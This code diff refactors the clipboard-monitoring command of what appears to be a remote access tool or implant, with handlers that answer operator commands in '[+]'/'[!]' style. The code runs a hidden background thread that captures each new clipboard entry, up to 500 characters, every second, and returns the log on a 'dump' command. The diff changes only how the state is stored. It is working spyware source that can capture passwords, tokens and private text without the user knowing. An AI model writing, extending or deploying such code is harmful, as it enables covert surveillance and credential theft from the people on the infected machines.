@@ -26,35 +26,35 @@ def _cmd_clipboard_get(m):
         return {"output": "[!] No text on clipboard"}
     except Exception as e: return {"output": f"[!] Clipboard error: {e}"}
 
-_clip_monitor_run = [False]
-_clip_log = []
+_clip_state = {"run": False, "log": []}
 
 def _clip_monitor_thread():
     last = None
-    while _clip_monitor_run[0]:
+    while _clip_state["run"]:
         try:
             text = _get_clipboard_text()
             if text and text != last:
                 last = text
-                _clip_log.append(text[:500])
-        except: pass
+                _clip_state["log"].append(text[:500])
+        except:
+            pass
         time.sleep(1)
 
 def _cmd_clipboard_monitor(m):
     try:
         action = m.get("action", "start")
         if action == "start":
-            if _clip_monitor_run[0]: return {"output": "[!] Clipboard monitor already running"}
-            _clip_monitor_run[0] = True
-            _clip_log.clear()
+            if _clip_state["run"]: return {"output": "[!] Clipboard monitor already running"}
+            _clip_state["run"] = True
+            _clip_state["log"].clear()
             threading.Thread(target=_clip_monitor_thread, daemon=True).start()
             return {"output": "[+] Clipboard monitor started"}
         elif action == "stop":
-            _clip_monitor_run[0] = False
+            _clip_state["run"] = False
             return {"output": "[+] Clipboard monitor stopped"}
         elif action == "dump":
-            logs = list(_clip_log)
-            _clip_log.clear()
+            logs = list(_clip_state["log"])
+            _clip_state["log"].clear()
             return {"output": "\n".join(logs[-20:]) if logs else "[!] No clipboard captures"}
         return {"output": "[!] Use action=start/stop/dump"}
     except Exception as e: return {"output": f"[!] Clipboard monitor error: {e}"}
